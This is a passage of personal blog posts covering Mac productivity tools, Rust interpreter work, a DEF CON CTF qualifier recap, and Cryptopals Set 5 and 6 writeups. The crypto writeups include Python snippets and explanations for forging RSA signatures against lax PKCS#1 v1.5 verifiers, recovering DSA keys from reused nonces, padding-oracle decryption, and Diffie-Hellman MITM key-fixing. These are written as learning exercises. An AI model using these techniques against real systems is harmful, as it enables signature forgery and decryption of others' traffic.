Adjusting it is a pain, though. Ergonomic keyboards I‚Äôve recently started using the Microsoft Natural 4000 at work, and it puts less strain on the fingers than the default Mac keyboard. The built-in wrist rest and sloping contours are comfortable, though it‚Äôs quite a large keyboard and my small hands stretch to reach some keys. For the power user, justaperson will testify that the Ergodox-EZ, at $300, is not cheap, but certainly worth it. It comes in two pieces so that you can arrange your hands at shoulder width, which is the optimal position for ergonomics. There‚Äôs software to program the keys however you want, and you can get versions with or without printed keycaps. And if you‚Äôre a fan of mechanical keys, you can choose your preferred type. Note that it takes some getting used to, as justaperson can tell you, but he now uses it all the time. Mac Customizations My Mac environment has layers of speedups, shortcuts, and tricks, some of which are so superb that I don‚Äôt know how anyone works without them. Here goes: BetterTouchTool I‚Äôve been using BetterTouchTool for years, and it‚Äôs absolutely incredible. The sheer number of features that now exist, including its mouse, trackpad, touchbar, keyboard integrations, allow any shortcut imaginable. When people ask me, ‚Äúhow the hell are you doing _______ on your Mac??‚Äù, my answer is probably BetterTouchTool! Here are my best customizations that Mac users will salivate over: Window resizing by holding option and dragging mouse anywhere in the window Window moving by holding ‚åò and dragging mouse anywhere in the window ‚åò+E opens the amazing BetterTouchTool Window Switcher. Miles better than ‚åò+Tab Opt+Ctrl+T to open a Finder window from anywhere I‚Äôve mapped a ton of Opt+letter or arrow keys to snap a window to a corner, half, or third of the screen. Now that I use the J-Tech mouse, I‚Äôve mapped the two extra buttons to the Window Switcher as well. MAGIC!! The best part is that it‚Äôs pay-what-you-want (with a measly minimum of $6), while its functionality feels like it‚Äôs worth as much as the Mac itself. Karabiner This nifty, free keyboard customizer can do key modifications ranging from simple to mind-boggling, per-keyboard profiles, and more. I don‚Äôt have many shortcuts, but I appreciate being able to map Return to Ctrl, so I put less strain on my left pinky, which often occurs when using tmux, vim or emacs (look up emacs pinky!). If I press Return alone, it enters a line break, but if I hold it and press another key, I get Ctrl functionality. Neat! I also sometimes remap Microsoft keyboards to make the left-corner keys more like a Mac‚Äôs Ctrl, Option, and ‚åò. For MacOS Sierra, you‚Äôll need Karabiner-Elements, a beta version which provides much the same functionality. Copy‚ÄôEm Paste STOP SWITCHING WINDOWS TO PASTE MULTIPLE THINGS! Everyone needs a good clipboard manager, no matter what platform you‚Äôre on. Copy‚ÄôEm Paste is everything you‚Äôll ever need from one. I love that it has a customizable hotkey, favorites, search, image clipping, and option to paste richtext or plaintext. It‚Äôs well worth the $15 price tag, though I won‚Äôt say where I got mine‚Ä¶ Multiple Desktops Many Mac users may already know about Multiple Desktops, but here‚Äôs a nice hack: Each desktop is associated with a specific task, and you can use Ctrl+number hotkeys to quickly switch to what you need. For instance, you can put music in Desktop 8, a terminal in Desktop 7, email in Desktop 9, and navigating to each becomes muscle memory. I learned this trick from firescar a few years ago. He was doing this on Linux, and I discovered that Multiple Desktops give the same effect on Macs. iTerm2 iTerm is strictly better than Mac‚Äôs built-in Terminal. If you don‚Äôt have it, make the switch right now. Its endless customizations and even a black-magic tmux integration mode are a boon for programmers who use their terminal more than their browsers. I also switched from bash to zsh for the awesome plugins that make the terminal 1000x better. Here‚Äôs the best zsh plugins I use: fasd ‚Äî Never cd to a full pathname again! This plugin remembers your previous working directories, so you can simply type part of a directory name and it will automatically go to the most recent/most used folder that matches fuzzy search osx ‚Äî Simple shortcuts like ofd to open the present working directory in a Finder window. Pretty cool, right? history-substring-search ‚Äî Instead of Ctrl+R for a shitty back-search, simply type a partial command and press the Up arrow to get a fuzzy search to recent matches. Running previous commands has never been easier‚Ä¶ git ‚Äî Dozens of aliases for git. Enough said. You‚Äôre welcome!","categories":[{"name":"Meta","slug":"Meta","permalink":"http://raywang.tech/categories/Meta/"}],"tags":[]},{"title":"Looking Towards Summer: Concolic Execution, Fuzzy Panda, and More","slug":"2017/Looking towards Summer: Concolic Execution, Fuzzy Panda, and more","date":"2017-05-23T06:55:00.000Z","updated":"2017-09-29T19:20:01.000Z","comments":true,"path":"2017/05/23/2017/Looking towards Summer: Concolic Execution, Fuzzy Panda, and more/","link":"","permalink":"http://raywang.tech/2017/05/23/2017/Looking towards Summer: Concolic Execution, Fuzzy Panda, and more/","excerpt":"It‚Äôs always bothered me that MIT or MIT Lincoln Lab didn‚Äôt submit anything to DARPA‚Äôs Cyber Grand Challenge. With all the smart people, such as my advisor, Armando Solar-Lezama, working on program analysis and formal methods (which I currently know nothing about), I would have expected that we could create a strong Cyber Reasoning System worthy of CGC. That‚Äôs sort of what I will be working on this summer at Lincoln and probably writing my thesis on. But I‚Äôm very new to the field and have just started diving in.","text":"It‚Äôs always bothered me that MIT or MIT Lincoln Lab didn‚Äôt submit anything to DARPA‚Äôs Cyber Grand Challenge. With all the smart people, such as my advisor, Armando Solar-Lezama, working on program analysis and formal methods (which I currently know nothing about), I would have expected that we could create a strong Cyber Reasoning System worthy of CGC. That‚Äôs sort of what I will be working on this summer at Lincoln and probably writing my thesis on. But I‚Äôm very new to the field and have just started diving in. I will primarily be engineering on panda, LL‚Äôs dynamic analysis platform. I will first need to implement record-replay for PowerPC, because that‚Äôs what a lot of embedded devices are still programmed in. More on this later‚Ä¶ Anyways, I‚Äôve decided that I‚Äôm going to take 6.035 again in Fall, but this time in Haskell. The fall version will have a language much simpler semantics but is going to be very optimization-heavy. I‚Äôd like to get the experience in functional programming, as well as implement the optimizations that I didn‚Äôt get to this semester. I still want to get better at Rust, though, so I will continue working on this Spring‚Äôs version of 035, the MITScript dynamic language. I would like to get the code generator fully working and integrate a generational GC. Thank goodness I have JustAPerson around to help me debug Rust. For the sake of learning Haskell and LLVM, I‚Äôll try to follow the Kaleidoscope tutorial. JustAPerson seems to think I won‚Äôt be able to handle 6.035 in Haskell unless I spend the whole summer practicing. Fortenforge and I will also be finishing the Matasano Crypto Challenges and working on a packet analysis framework for Lab RATs to use at DEF CON this summer. Many things to do!","categories":[{"name":"Meta","slug":"Meta","permalink":"http://raywang.tech/categories/Meta/"},{"name":"Research","slug":"Meta/Research","permalink":"http://raywang.tech/categories/Meta/Research/"}],"tags":[{"name":"Panda","slug":"Panda","permalink":"http://raywang.tech/tags/Panda/"},{"name":"Symbolic Execution","slug":"Symbolic-Execution","permalink":"http://raywang.tech/tags/Symbolic-Execution/"},{"name":"Program Analysis","slug":"Program-Analysis","permalink":"http://raywang.tech/tags/Program-Analysis/"}]},{"title":"Matasano Crypto Challenges, Set 6","slug":"2017/Matasano Crypto Challenges, Set 6","date":"2017-05-21T13:40:00.000Z","updated":"2018-01-05T07:41:47.000Z","comments":true,"path":"2017/05/21/2017/Matasano Crypto Challenges, Set 6/","link":"","permalink":"http://raywang.tech/2017/05/21/2017/Matasano Crypto Challenges, Set 6/","excerpt":"The last of the original crypto challenges‚Ä¶ here we go! Challenge 41 Implement unpadded message recovery oracle Unpadded RSA is homomorphic, meaning that, if operations like multiplication and addition are carried out on ciphertext, it is as if the same operation were applied to the plaintext.","text":"The last of the original crypto challenges‚Ä¶ here we go! Challenge 41 Implement unpadded message recovery oracle Unpadded RSA is homomorphic, meaning that, if operations like multiplication and addition are carried out on ciphertext, it is as if the same operation were applied to the plaintext. This can have many useful properties, but also produces some consequences. This challenge is analogous to a ‚Äúsecurity game‚Äù that tests for a property known as IND-CCA2 ‚Äî indistinguishability under Chosen Ciphertext Attack, where the adversary has access to a decryption oracle. The challenger gives the adversary a ciphertext, and the adversary can ask for the encryption and decryption of anything he wants ‚Äî except the challenge ciphertext, of course! If the adversary can learn any information about the ciphertext‚Äôs plaintext, then he wins the game. A fully homomorphic scheme fails IND-CCA2 ‚Äî the adversary can completely recover the message! The adversary can‚Äôt ask for the decryption of the challenge ciphertext, but he can ask for the decryption of 2*ciphertext, or 3*ciphertext, etc. and he knows that the result will be 2*plaintext, 3*plaintext. Just divide out the scaling factor, and you have the plaintext. Challenge 42 Bleichenbacher‚Äôs e=3 RSA Attack Another worry with low public exponent is that the message block, when encrypted, will not be large enough to wrap the modulus. This blog illustrates an attack on the padding scheme PKCS#1 1.5. When signing a message using RSA, the key-holder generates m ^ d mod N, and the recipient uses (N, e) to check that (m ^ d) ^ e = m mod N. But, instead of signing the message, you sign the PKCS1.5 encoding of the message‚Äôs HASH. In PKCS#1 1.5, you take the hash of the message you want to sign, and then you encode it like this: 00 01 FF FF ... FF FF 00 ASN.1 HASH A faulty PKCS 1.5 padding verifier might not check that all the \\xff bytes in the middle are present. Here‚Äôs an example of two faulty verifier versions: 12345678# Find the 00 separator between the padding and the payloadsep_idx = clearsig.index('\\x00', 2)# vulnerable python-rsa version, taking all the remainder of string after asn1 as the hashsignature_hash = clearsig[sep_idx+len(sha1_asn1)+1:]# weaker version, taking only the next 20 bytes as hash, allowing us to append garbagesignature_hash = clearsig[sep_idx+len(sha1_asn1)+1:sep_idx+len(sha1_asn1)+1+20] Looking at the weaker version, it‚Äôs very simple to construct a message block meeting those parameters. 123msg_hash = hashlib.sha1(msg).digest()garbage = '\\x00'*75forge_sig = \"\\x00\\x01\\xff\\x00\" + sha1_asn1 + msg_hash + garbage and then, we simply take the cube root of this forged sig, which undoes the encryption (a cubing). 12(cube_root, exact) = gmpy2.iroot(forge_sig_num, 3)cube_root += 1 The cube root will verify to a valid signature in the faulty padding verifier. Challenge 43 DSA key recovery from nonce The DSA signature scheme uses two cyclic groups. One large cyclic group, Z_p^{\\*}, has an order of a 1024 bit prime. Another cyclic group, Z_q^{\\*}, has an order of a 160 bit prime. The key generation is: Generate a 1024-bit prime ppp. Find a 160-bit prime divisor qqq of p‚àí1p-1p‚àí1. Find an element Œ±\\alphaŒ± which generates the subgroup of ppp with qqq elements; i.e., ord(Œ±)=qord(\\alpha) = qord(Œ±)=q. Choose a random ddd with 0&lt;d&lt;q0 &lt; d &lt; q0&lt;d&lt;q. Compute Œ≤‚â°Œ±dmodp\\beta \\equiv \\alpha^{d}\\bmod pŒ≤‚â°Œ±dmodp The keys are now: pub = (p,q,Œ±,Œ≤)(p,q,\\alpha,\\beta)(p,q,Œ±,Œ≤) priv = (d)(d)(d) A DSA signature is generated and verified as follows: Signing: Choose a random ephemeral key 0&lt;ke&lt;q0 &lt; k_e &lt; q0&lt;ke‚Äã&lt;q Compute r‚â°Œ±kemodqr \\equiv \\alpha^{k_e} \\bmod qr‚â°Œ±ke‚Äãmodq Compute s‚â°(SHA(x)+d‚ãÖr)ke‚àí1modqs \\equiv (SHA(x) + d\\cdot r) k_e^{-1}\\bmod qs‚â°(SHA(x)+d‚ãÖr)ke‚àí1‚Äãmodq Verifying: Compute aux value w‚â°s‚àí1modqw \\equiv s^{-1} \\bmod qw‚â°s‚àí1modq Compute aux value u1‚â°w‚ãÖSHA(x)modqu_1 \\equiv w \\cdot SHA(x) \\bmod qu1‚Äã‚â°w‚ãÖSHA(x)modq Compute aux value u2‚â°w‚ãÖrmodqu_2 \\equiv w \\cdot r \\bmod qu2‚Äã‚â°w‚ãÖrmodq Compute v‚â°(Œ±u1‚ãÖŒ≤u2modp)modqv \\equiv (\\alpha^{u_1}\\cdot \\beta ^{u_2} \\bmod p) \\bmod qv‚â°(Œ±u1‚Äã‚ãÖŒ≤u2‚Äãmodp)modq Verify v‚â°rmodqv \\equiv r \\bmod qv‚â°rmodq 1234567891011121314151617181920def dsa_sign(msg, d): k_e = random.randint(0, q) r = pow(g, k_e, p) % q x = bytes2int(hashlib.sha1(msg).digest()) s = ((x + d*r)*modinv(q, k_e)) % q return (r,s)def dsa_verify(msg, r, sig, B): x = bytes2int(hashlib.sha1(msg).digest()) #compute aux value w s_inv = modinv(q, sig) u_1 = s_inv*x % q u_2 = s_inv*r % q v = (pow(g, u_1, p) * pow(B, u_2, p) % p) % q return v == r%q To recover the private key if we know kkk, we just solve for xxx in the equation for sss: d=s‚ãÖke‚àíSHA(x)rmodqd = \\frac{s\\cdot k_e - SHA(x)}{r} \\bmod q d=rs‚ãÖke‚Äã‚àíSHA(x)‚Äãmodq Challenge 44 DSA nonce recovery from repeated nonce Let‚Äôs work out how we can recover the k given a pair of messages that use repeated k. \\begin{align} s_1 - s_2 &= (m_1 + dr)k^{-1} - (m_2 + dr)k^{-1} \\\\\\\\ &= (m_1 - m_2)k^{-1} \\\\\\\\ k &= \\frac{m_1 - m_2}{s_1 - s_2} \\end{align} Challenge 45 DSA parameter tampering If we make the generator equal to p+1p+1p+1, then raising it to any power mod p will be 1. This allows us to forge a signature for any message. Challenge 46 RSA parity oracle The idea is to multiply the message by successive powers of 2, and using our parity oracle to check whether the result is even or odd. This allows us to update the upper or lower bound ‚Äî if odd, the multiplication wrapped the modulus, and we update the lower bound. If even, we didn‚Äôt wrap the modulus, and we have a tighter higher bound. The answer at this StackExchange post allows us to see why. Briefly, when we multiply by 2 and then 4, if we get (even, even) then we haven‚Äôt wrapped the modulus, and the message is &lt; N/4. If we get (odd, odd), then we know that we‚Äôve wrapped the modulus twice ‚Äî only possible if 3/4N &lt; P &lt; N. Make sure you see why: the result of the first doubling will be between 1/2N and N, so the second doubling will again wrap the modulus. Do this iteratively, until you tighten the bounds enough to get every byte of the message, which will be discovered byte-by-byte. Challenge 47-48 Bleichenbacher‚Äôs attack Bleichenbacher‚Äôs attack shows how we can break RSA+PKCS1 padding using an adaptive chosen-ciphertext attack and a PKCS oracle. The PKCS oracle will tell you whether a ciphertext decrypts to a plaintext with the following structure: The first two bytes are \\x00\\x02 There is at least one null byte after the first null byte Here‚Äôs the attack ‚Äî the description in the original paper is good: The attacker tries to find small values sis_isi‚Äã for which the ciphertext c0(si)emodnc_0(s_i)^e \\bmod nc0‚Äã(si‚Äã)emodn is PKCS conforming. For each successful value for sis_isi‚Äã, the attacker computes, using previous knowledge about m0m_0m0‚Äã, a set of intervals that must contain m0m_0m0‚Äã‚Ä¶ The third phase starts when only one interval remains. Then, the attacker has sufficient information about m0m_0m0‚Äã to choose sis_isi‚Äã such that c0(si)emodnc_0(s_i)^e \\bmod nc0‚Äã(si‚Äã)emodn is much more likely to be PKCS conforming than is a randomly chosen message. The size of sis_isi‚Äã is increased gradually, narrowing the possible range of m0m_0m0‚Äã until only one possible value remains. The paper splits this up into four steps, which we can each implement as separate functions directly. The first step, blinding, is not really that important ‚Äî it asks you to choose random integers s0s_0s0‚Äã until you find one s.t. c(s0)emodnc(s_0)^e \\bmod nc(s0‚Äã)emodn is PKCS-conforming. But, you can just make sure that ccc is already PKCS-conforming (by PKCS-padding the corresponding plaintext ppp), so s0s_0s0‚Äã is trivially 1. Most difficulties you might encounter when implementing this attack are with regards to the bounds. You have to be very careful about correctly handling all the ‚â§\\leq‚â§ and interval bounds. Other things to note when reading the four steps to implement in the paper: As the prompt says, ‚Äúa PKCS#1v1.5 conformant plaintext, one that starts with 00:02, must be a number between 02:00:00‚Ä¶00 and 02:FF:FF‚Ä¶FF ‚Äî in other words, 2B and 3B-1, where B is the bit size of the modulus minus the first 16 bits‚Äù. You must see why this is true. In step 2c, you just need to find one next sis_isi‚Äã. Iterate over each rir_iri‚Äã, and then iterate over all sis_isi‚Äã's possible for that rir_iri‚Äã. In step 3, the most important step, you narrow the intervals in which the message can exist. Each interval is a pair (a,b)(a,b)(a,b), and you iterate over all rrr for each (a,b)(a,b)(a,b) pair. Finally, once we have just one interval with one value aaa left, we‚Äôre done! We can recover the original plaintext from the answer a‚â°c‚ãÖs0modna \\equiv c\\cdot s_0 \\bmod na‚â°c‚ãÖs0‚Äãmodn and m‚â°a‚ãÖs0‚àí1modnm \\equiv a\\cdot s_0^{-1} \\bmod nm‚â°a‚ãÖs0‚àí1‚Äãmodn. 12345if len(m_intervals) == 1 and m_intervals[0][0] == m_intervals[0][1]: # We're done! a = m_intervals[0][0] m = a * modinv(n, 1) return m 1assert found_msg == b&quot;kick it, CC&quot;","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"}],"tags":[{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"}]},{"title":"DEF CON CTF Qualifier 2017","slug":"2017/DEF CON CTF Qualifier 2017","date":"2017-05-03T16:12:00.000Z","updated":"2018-05-14T22:41:57.439Z","comments":true,"path":"2017/05/03/2017/DEF CON CTF Qualifier 2017/","link":"","permalink":"http://raywang.tech/2017/05/03/2017/DEF CON CTF Qualifier 2017/","excerpt":"Update 5/5/17: We qualified to DEF CON CTF 2017!!! We just got the email today! Congrats to everyone from Lab RATs, TechSec, and RPISEC that competed. Vegas, here we come!","text":"Update 5/5/17: We qualified to DEF CON CTF 2017!!! We just got the email today! Congrats to everyone from Lab RATs, TechSec, and RPISEC that competed. Vegas, here we come! This past weekend, I competed in my first DEF CON CTF Qualifier. Our club TechSec teamed up with Lab RATs (Lincoln Labs‚Äô CTF team) and RPISEC, and this powerhouse team ended up placing 10th. We beat out some very strong teams, including LCBC (the top Russian team), Dragon Sector (Poland), KaisHack (Korea Advanced Inst. of Science and Tech), and binja (Japan). What‚Äôs at stake Held in Las Vegas every July at the DEF CON conference, DEF CON CTF attracts the best hacking teams in the world. Teams compete year-round to nab a qualification spot in Vegas and have a chance at the title. Format and griping Let me get a few complaints out of the way. A few things that bother me about DEF CON CTF are the lack of clarity on qualification rules and the frustrating format of the qualifier. First of all, all the challenges are Reverse Engineering and Pwn/Exploitation ‚Äî most are totally inaccessible to beginners like most of TechSec‚Äôs members. There was one problem in the Web category that actually turned out to be pwn as well (surprise!). Also, for the first two days, only a few challenges are ever available at a time, because most are locked. The team that solves the most recent challenge gets to choose which challenge to unlock next. The small numbers of challenges are meant to not overwhelm smaller teams ‚Äî but on the last day, the floodgates open‚Ä¶ LegitBS has been organizer of the CTF since 2013. They usually take 15 teams from eight prequalifying events + DEF CON Quals, but how they deal with teams that qualify multiple times is uncertain. I wish they were more clear/communicative about this. Last year, LegitBS took ten from DEF CON Quals because two teams (LCBC and PPP) prequaled twice and another prequaled team (StratumAuhuur) dropped out. This year, it seems that they‚Äôre taking nine, just missing us üò¶. At the very least, we helped Lab RATs jump from 32nd place to 10th from last year to this year. We will probably receive an email later this week as to whether we‚Äôve qualified or are first alternates. There‚Äôs a small chance we may still make it, if another team drops out or a team that‚Äôs already qualed wins the last qualifying event, 0ctf, in June. Regardless of whether we end up qualifying, I had a thrilling experience. Rahul (fortenforge) and I worked with Lincoln at the BeaverWorks space the whole weekend, contributing where we could. We took the occasional break for Lego Batman, MIT tent parties, and sleep, but otherwise we were plugged in. In the antepenultimate hour, our team solved three challenges in quick succession ‚Äî awsno (the web chal), pegem, and pepperidge farm. That put us in a tie with two other teams, and we needed just one more solve to guarantee our spot. We were working on four other chals, none of which we ended up solving in time. Challenges I won‚Äôt be doing full writeups in this blog post, but I‚Äôll be describing some of my favorite challenges briefly. Pegem Pegem was a problem in the RE category (but actually pwn) in the one-instruction esolang SUBLEQ (SUbtract and Branch if Less than or EQual to zero). You had to solve a peg game written in SUBLEQ, run by a C emulator. Once you won the game, there was a ‚Äúbuffer overflow‚Äù that allowed you to modify the SUBLEQ program itself, changing its control flow to print out the flag byte-by-byte. The flag: Who needs more than one instruction? Insanity!!! This challenge took in audio files zlib-compressed, and used a speech-to-text library to interpret each word as either ‚Äòinsanity‚Äô or ‚Äòinsane‚Äô. Depending on how many ‚Äòinsanities‚Äô were preceding an ‚Äòinsane‚Äô, the program would execute one of 9 opcodes in a stack-based interpreter. The exploitable bugs were in the interpreter, so we used OSX‚Äôs say command to produce audio files with the word insanity repeated 1-100 times. Thanks Samantha (or Siri, as you might know her)! Jargon vito fuzyll + gynophage hj hoju = bja lightning fuzyll That‚Äôs the kind of shit that I spent the wee hours of Sunday staring at. This was a black-box RE problem that took in nibbles of data over a network port, and interpreted them as random words or names of the organizers ‚Äî vito, selir, jymbolia, etc. Each nibble corresponded to an opcode for a stack-based interpeter ‚Äî dead beaf was push, xyzzy was multiply. I discovered a syscall opcode that took whatever was pushed onto the stack and executed that syscall, so I started fuzzing until I found one valid syscall ‚Äî hj hoju, that pushed a bunch of crap to the stack. This crap turned out to be the flag, once fortenforge figured out how the words corresponded to digits! Quite a team effort and a fun problem, though I wish we had solved a bit faster, given that I was staring at the flag without realizing it for hours. All we can do now is wait and see‚Ä¶ at the very least, our chances look good for next year.","categories":[{"name":"CTF","slug":"CTF","permalink":"http://raywang.tech/categories/CTF/"}],"tags":[{"name":"TechSec","slug":"TechSec","permalink":"http://raywang.tech/tags/TechSec/"}]},{"title":"Generating and Interpreting Bytecode for MITScript ‚Äî Using Rust","slug":"Generating-and-interpreting-bytecode-for-MITScript-‚Äî-using-Rust","date":"2017-05-03T16:00:40.000Z","updated":"2017-09-29T19:20:01.000Z","comments":true,"path":"2017/05/03/Generating-and-interpreting-bytecode-for-MITScript-‚Äî-using-Rust/","link":"","permalink":"http://raywang.tech/2017/05/03/Generating-and-interpreting-bytecode-for-MITScript-‚Äî-using-Rust/","excerpt":"Well, this was my first foray into the world of Rust, the systems language that is Mozilla‚Äôs precious baby. And what better way to learn this hip new language than to write an MITScript bytecode interpreter for Computer Language Engineering? Rust was not gentle for this first-time developer. It does so much to protect you that my first attempt writing a few hundred lines of code resulted in the same number of compiler errors, and I needed a lot of help from my team to just get anything to compile. For this reason, it‚Äôs not great for iterating quickly if you aren‚Äôt very experienced already. But, I‚Äôm licking my chops at the fact that the end result will be much safer, and hopefully faster, than our classmates‚Äô C++ compilers. This post will be about the struggles I encountered as a Rust newbie, as well as the fun of generating/interpreting MITScript bytecode.","text":"Well, this was my first foray into the world of Rust, the systems language that is Mozilla‚Äôs precious baby. And what better way to learn this hip new language than to write an MITScript bytecode interpreter for Computer Language Engineering? Rust was not gentle for this first-time developer. It does so much to protect you that my first attempt writing a few hundred lines of code resulted in the same number of compiler errors, and I needed a lot of help from my team to just get anything to compile. For this reason, it‚Äôs not great for iterating quickly if you aren‚Äôt very experienced already. But, I‚Äôm licking my chops at the fact that the end result will be much safer, and hopefully faster, than our classmates‚Äô C++ compilers. This post will be about the struggles I encountered as a Rust newbie, as well as the fun of generating/interpreting MITScript bytecode. Fortunately, I had some great Rust developers on my team ‚Äì Jason and James Gilles, who have been avid Rustaceans for years. If you have ever seen bytecode, you‚Äôll expect to see some non-human-readable hex bytes that stand for instructions. Instead, we have a strange text-based bytecode consisting of the following instructions: Load/store instructions: 1234567891011121314LoadConst LoadFunc LoadLocal StoreLocal LoadGlobal StoreGlobal PushReferenceLoadReference StoreReference AllocRecord FieldLoad FieldStore IndexLoad IndexStore Closure functions: 123AllocClosure Call Return Binary/unary ops: 1234567891011Add Sub Mul Div Neg Gt Geq Eq And Or Not Control flow: 12GotoIf Stack manipulation: 123Dup Swap Pop And the full bytecode is a series of nested functions, like 123456789101112131415161718192021222324252627282930313233343536373839404142434445function&#123; functions = [ function &#123; functions =[ function &#123; functions = [], constants = [], parameter_count = 1, local_vars = [z], local_ref_vars = [], free_vars = [y], names = [x], instructions = [ ... return ] &#125; ], constants = [None, 1], parameter_count = 1, local_vars = [y, g], local_ref_vars = [y], free_vars = [], names = [], instructions = [ ... return ] &#125; ], constants = [1, None], parameter_count = 1, local_vars = [], local_ref_vars = [], free_vars = [], names = [x, f], instructions = [ ... ]&#125; Some things to note: A free_var is a variable from a parent scope that‚Äôs accessed in the current function. A closure contains a function, as well as a list of references to the free variables in the nested function. So, when we make a call, we need to clone all the closure‚Äôs free variable references into the newly created frame. Pieces of the puzzle We split up the work into three parts. James quickly finished the bytecode parser, using the Rust library lalrpop. Jason and I worked on (last minute) the bytecode generation and interpreting, respectively. Each bytecode function was modeled as a Function struct. I also have a Frame structure that, as in the AST interpreter from Lab 2, contains the context for the currently executing closure. Most importantly, there is an operand stack onto which references, values, closures, etc. are pushed and popped as opcodes are executed. The HeapValue enum lists them all: 123456789101112131415type FrameSlot = Gc&lt;RefCell&lt;HeapValue&gt;&gt;;pub enum HeapValue &#123; Reference(FrameSlot), Record(Gc&lt;RefCell&lt;Record&gt;&gt;), Function(Gc&lt;Function&gt;), Closure(Gc&lt;Closure&gt;), // note: oddly enough, foreign functions behave more like // closures, since you can actually call them ForeignFunction(ForeignFunction), String(String), Integer(i64), Boolean(bool), None,&#125; References have a layer of indirection provided by the Gc&lt;RefCell&lt;&gt;&gt; construct in Rust. Gc is just an alias for Rc. In Rust, Rc is a reference-counted pointer, and RefCell is a wrapper for a mutable value. RefCell introduces something called ‚Äúinterior mutability‚Äù, which allows us to modify an otherwise-immutable location like a field in a struct. We can use borrow or borrow_mut to get a pointer to the value contained in the RefCell. The bytecode generator Jason did this part almost entirely himself, and had to wrangle with some tricky scoping rules that I still don‚Äôt entirely understand. One key function is lookup_variable, which determines whether a variable is a reference, local, or global. 123456789101112131415161718/// Determines what scope a variable's value should be found inpub fn lookup_variable(&amp;mut self, name: &amp;str) &#123; if self.globals.contains(name) &#123; self.map.insert(name.to_owned(), Location::Global); &#125; else if self.locals.contains(name) &#123; self.map.insert(name.to_owned(), Location::Local); &#125; else if self.lookup_ref(name) &#123; // We found the variable in a parent scope self.free.push(name.to_owned()); self.map.insert(name.to_owned(), Location::Reference); &#125; else if self.lookup_global(name) &#123; // Found the var in one of the active globals self.globals.push(name.to_owned()); self.map.insert(name.to_owned(), Location::Global); &#125; else &#123; panic!(\"Uninitialized variables &#123;&#125;\", name); &#125; &#125; lookup_ref also propagates up to parents, pushing a reference variable in parent scopes, because it has to be in each parent scope to be copied down to the current scope! To be more clear, say we have nested functions f1, f2‚Ä¶f100; and f100 uses some variable x that is local to f3. f4‚Ä¶f99 must all have x as a free variable, so when we see that x is being used in f100, lookup_ref will add it as a free variable for all parents. Next, we actually need to start thinking about performance! We‚Äôll write a garbage collector for our compiler in Lab 4.","categories":[{"name":"Languages","slug":"Languages","permalink":"http://raywang.tech/categories/Languages/"}],"tags":[{"name":"6.035","slug":"6-035","permalink":"http://raywang.tech/tags/6-035/"}]},{"title":"Matasano Crypto Challenges, Set 5","slug":"set5-writeup","date":"2017-04-21T19:25:14.000Z","updated":"2017-12-27T22:24:43.000Z","comments":true,"path":"2017/04/21/set5-writeup/","link":"","permalink":"http://raywang.tech/2017/04/21/set5-writeup/","excerpt":"This set was surprisingly easy, actually. The book Understanding Cryptography by Paar &amp; Pelzl is an excellent intro to the basic maths needed for crypto ‚Äî namely, the group theory and number theory necessary for RSA and Diffie-Hellman. Let‚Äôs dive in! Challenge 33 Implement Diffie-Hellman Diffie-Hellman is a remarkably simple algorithm for two parties to jointly compute a shared secret key that may be used, for example, as a key for symmetric encryption. Alice and Bob agree on an integer group of prime ppp, with a generator ggg. ggg raised to every power in 0...p‚àí1{0...p-1}0...p‚àí1, taken modp\\bmod pmodp, can produce every element of ppp. Hence, it is called a ‚Äúgenerator‚Äù of the group.","text":"This set was surprisingly easy, actually. The book Understanding Cryptography by Paar &amp; Pelzl is an excellent intro to the basic maths needed for crypto ‚Äî namely, the group theory and number theory necessary for RSA and Diffie-Hellman. Let‚Äôs dive in! Challenge 33 Implement Diffie-Hellman Diffie-Hellman is a remarkably simple algorithm for two parties to jointly compute a shared secret key that may be used, for example, as a key for symmetric encryption. Alice and Bob agree on an integer group of prime ppp, with a generator ggg. ggg raised to every power in 0...p‚àí1{0...p-1}0...p‚àí1, taken modp\\bmod pmodp, can produce every element of ppp. Hence, it is called a ‚Äúgenerator‚Äù of the group. So, Alice and Bob each choose a random group element and use that as a power of ggg. Alice computes A=gamodpA = g^a\\bmod pA=gamodp, a \\in Z_p^\\*. Bob computes B=gbmodpB = g^b\\bmod pB=gbmodp, b \\in Z_p^\\*. What‚Äôs important to Diffie-Hellman is that, given AAA and ggg, one cannot easily compute aaa. This is called the Discrete Log Problem. The value AAA looks like a totally random element of Z_p^\\*! Then, Alice sends AAA to Bob and Bob sends BBB to Alice. Alice computes BamodpB^a \\bmod pBamodp and Bob computes AbmodpA^b \\bmod pAbmodp, which are equal, since gab=gbag^{ab} = g^{ba}gab=gba. Implementing this is easy in python with the built-in pow function. However, for educational purposes, I wrote the modexp function for fast modular exponentiation. The modexp function is taken from Paar and Pelzl. The exponent is converted to binary, and for each bit, we square the result. Also, if the bit is 1, we multiply the result by the base. The final algorithm is 1234567# Create secret keys, random values mod pa = random.randint(0, p)A = modexp(g, a, p)b = random.randint(0, p)B = modexp(g, b, p)shared_key_a = modexp(A, b, p) Challenge 34 Implement a MITM key-fixing attack on Diffie-Hellman with parameter injection Again, pwntools to the rescue! This challenge requires some client/server sockets, which I use the pwntools tubes library for. At a high level, the challenge demonstrates that, if an attacker were able to sit in the middle of a DH key exchange session and modify the messages being passed, he can control the key and decrpyt all the traffic. The client sends (p, g, A) to the server, and the server responds with B. If you recall, p and g are the public agreed-upon parameters for the group prime and generator. A is the Client‚Äôs piece of the secret key, and B is the Server‚Äôs piece. If an attacker replaces A and B with p, then both Client and Server will compute the key to be pamodp =pbmodp=0p^a \\bmod p \\ = p^b \\bmod p = 0pamodp =pbmodp=0. 0 is then hashed and used as the symmetric key for AES-encrypting messages, so the attacker can decrypt all the communications. Challenge 35 Implement DH with negotiated groups, and break with malicious ‚Äúg‚Äù parameters Let‚Äôs see what happens when we choose different values for the generator ggg. When g=1g = 1g=1, all powers of ggg are 1 as well, so the secret key is always 111. When g=pg = pg=p, as we saw in the previous challenge, powers are all divisible by ppp, so the key is always 000. When g=p‚àí1g = p-1g=p‚àí1 is raised to a power, all the terms with ppp will be 0modp0 \\bmod p0modp, leaving either 111 or ‚àí1=p‚àí1modp-1 = p-1 \\bmod p‚àí1=p‚àí1modp. Challenge 36 Implement Secure Remote Password (SRP) Secure Remote Password is really cool. It is a form of authentication in which the client does not need to reveal her password ‚Äî a form of zero-knowledge. The setup involves some large primes, and the security relies on discrete log, as before. A large prime modulus N is chosen, along with a generator g and a magic parameter kkk that is generally set to 3. The server stores a verifier for a client that wants to authenticate, v=gxv = g^xv=gx, where x=H(salt‚à£password)x = 